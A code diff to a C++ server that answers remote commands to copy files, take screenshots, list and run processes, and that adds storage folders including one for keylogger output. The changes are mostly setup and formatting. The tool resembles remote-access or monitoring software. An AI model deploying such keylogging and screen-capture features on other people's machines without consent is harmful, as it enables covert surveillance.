@@ -1,6 +1,42 @@
 #include "server.h"
 #include <sstream>
 
+void ensureFolders()
+{
+    std::filesystem::path copyfile = "../data/copyfile";
+    std::filesystem::path video = "../data/video";
+    std::filesystem::path process = "../data/process";
+    std::filesystem::path screenshot = "../data/screenshot";
+    std::filesystem::path keylog = "../data/keylogger";
+    try
+    {
+        if (!std::filesystem::exists(copyfile))
+            std::filesystem::create_directories(copyfile);
+        if (!std::filesystem::exists(video))
+            std::filesystem::create_directories(video);
+        if (!std::filesystem::exists(process))
+            std::filesystem::create_directories(process);
+        if (!std::filesystem::exists(screenshot))
+            std::filesystem::create_directories(screenshot);
+        if (!std::filesystem::exists(keylog))
+            std::filesystem::create_directories(keylog);
+    }
+    catch (const std::exception &e)
+    {
+    }
+}
+
+Server::Server(std::string _port)
+{
+    ensureFolders();
+    if (_port.empty())
+    {
+        port = PORT;
+    }
+    else
+        port = _port;
+}
+
 Server::Server()
 {
 }
@@ -85,7 +121,8 @@ void Server::ProcessCommand()
     std::string com, body;
     ss >> com;
     std::getline(ss, body);
-    if(!body.empty())body=body.substr(1);
+    if (!body.empty())
+        body = body.substr(1);
     if (com == "COPYFILE")
     {
         std::string destPath = CopyToPath(body);
@@ -139,15 +176,15 @@ void Server::ProcessCommand()
             SendResult(path_to_send);
         }
     }
-    else if(com=="TAKE_SCREENSHOT")
+    else if (com == "TAKE_SCREENSHOT")
     {
         takeScreenShot();
         SendResult("../data/screenshot/screenshot.png");
     }
     else if (com == "GET_RUNNING_PROCESS")
     {
-       listProcesses();
-       SendResult("../data/process/running_process.txt");
+        listProcesses();
+        SendResult("../data/process/running_process.txt");
     }
     else if (com == "RUN_PROCESS")
     {
